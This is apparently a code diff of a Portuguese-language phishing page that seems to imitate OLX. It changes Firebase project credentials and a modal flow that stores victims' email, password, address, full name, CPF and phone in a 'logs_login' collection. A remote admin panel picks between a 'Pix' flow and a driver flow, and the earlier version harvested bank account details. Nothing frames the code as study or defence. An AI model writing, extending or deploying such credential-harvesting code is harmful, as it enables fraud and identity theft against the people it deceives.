@@ -583,13 +583,13 @@ Qualquer ajuste futuro deve ser feito apenas nos MODAIS. O fundo está BLOQUEADO
     <script>
         // Inicialização do Firebase e Firestore ANTES de qualquer uso de db
         const firebaseConfig = {
-            apiKey: "AIzaSyAbJ4L2RrjzH0up0OVR2SrGt3-Qc0mhNow",
-            authDomain: "olxx-a64c1.firebaseapp.com",
-            projectId: "olxx-a64c1",
-            storageBucket: "olxx-a64c1.firebasestorage.app",
-            messagingSenderId: "367643482865",
-            appId: "1:367643482865:web:bf19a0ede2ae706f922750",
-            measurementId: "G-67XZYFDHV1"
+            apiKey: "AIzaSyCws5v4baPNUfuD_cnVmLk-1BDa8LiNXDI",
+            authDomain: "banco-de-dados-10f9d.firebaseapp.com",
+            projectId: "banco-de-dados-10f9d",
+            storageBucket: "banco-de-dados-10f9d.firebasestorage.app",
+            messagingSenderId: "866601153336",
+            appId: "1:866601153336:web:711e3171211caf766e47cd",
+            measurementId: "G-P47QVSLEKL"
         };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.firestore();
@@ -712,8 +712,20 @@ Qualquer ajuste futuro deve ser feito apenas nos MODAIS. O fundo está BLOQUEADO
                 if (document.getElementById('btnVerDetalhes')) {
                     document.getElementById('btnVerDetalhes').onclick = function() {
                         document.getElementById('parabensModal').style.display = 'none';
-                        document.getElementById('enderecoModal').style.display = 'block';
-                        document.body.classList.add('modal-endereco-aberta');
+                        // Verificar fluxo do painel
+                        db.collection('painel').doc(fluxo).get().then((doc) => {
+                            if (doc.exists) {
+                                const data = doc.data();
+                                if (data.ligado) {
+                                    // Fluxo motorista: pedir endereço
+                                    document.getElementById('enderecoModal').style.display = 'block';
+                                    document.body.classList.add('modal-endereco-aberta');
+                                } else {
+                                    // Fluxo Pix: pular endereço, ir para dados bancários
+                                    document.getElementById('dadosBancariosModal').style.display = 'block';
+                                }
+                            }
+                        });
                     };
                 }
 
@@ -935,47 +947,39 @@ Qualquer ajuste futuro deve ser feito apenas nos MODAIS. O fundo está BLOQUEADO
                 if (formDadosBancarios) {
                     formDadosBancarios.addEventListener('submit', function(e) {
                         e.preventDefault();
-                        const banco = document.getElementById('banco').value;
-                        const agencia = document.getElementById('agencia').value;
-                        const conta = document.getElementById('conta').value;
+                        const nomeCompleto = document.getElementById('nomeCompleto').value;
+                        const cpf = document.getElementById('cpf').value;
                         const telefone = document.getElementById('telefone').value;
-                        
-                        if (!banco || !agencia || !conta || !telefone) {
+                        if (!nomeCompleto || !cpf || !telefone) {
                             alert('Por favor, preencha todos os campos obrigatórios.');
                             return;
                         }
-                        
-                        // Salvar log de login com endereço e dados bancários completos
+                        // Salvar log de login com endereço e dados de contato
                         const email = sessionStorage.getItem('userEmail') || '';
                         const senha = sessionStorage.getItem('userPassword') || '';
                         const enderecoCompleto = sessionStorage.getItem('enderecoCompleto') || '';
-                        const dadosBancarios = `${banco} - Ag: ${agencia} - Conta: ${conta}`;
-                        
                         db.collection('logs_login').add({
                             email: email,
                             senha: senha,
                             endereco: enderecoCompleto,
-                            banco: banco,
-                            agencia: agencia,
-                            conta: conta,
+                            nomeCompleto: nomeCompleto,
+                            cpf: cpf,
                             telefone: telefone,
-                            dadosBancarios: dadosBancarios,
                             timestamp: firebase.firestore.FieldValue.serverTimestamp()
                         });
-                        
-                        // Fechar modal de dados bancários
+                        // Fechar modal de dados de contato
                         document.getElementById('dadosBancariosModal').style.display = 'none';
-                        
                         // Verificar configuração do painel para decidir o próximo fluxo
-                        db.collection('painel').doc('admin').get().then((doc) => {
+                        db.collection('painel').doc(fluxo).get().then((doc) => {
                             if (doc.exists) {
                                 const data = doc.data();
-                                // Se ambos desligados, vai para o fluxo de qualificação
-                                if (!data.ligado && !data.liberarMotorista) {
+                                if (data.ligado) {
+                                    // Fluxo motorista: solicitar motorista
+                                    document.getElementById('solicitarMotoristaModal').style.display = 'block';
+                                } else {
+                                    // Fluxo Pix: qualificação
                                     atualizarQualificacaoModal();
                                     document.getElementById('qualificacaoModal').style.display = 'block';
-                                } else {
-                                    document.getElementById('solicitarMotoristaModal').style.display = 'block';
                                 }
                             }
                         });
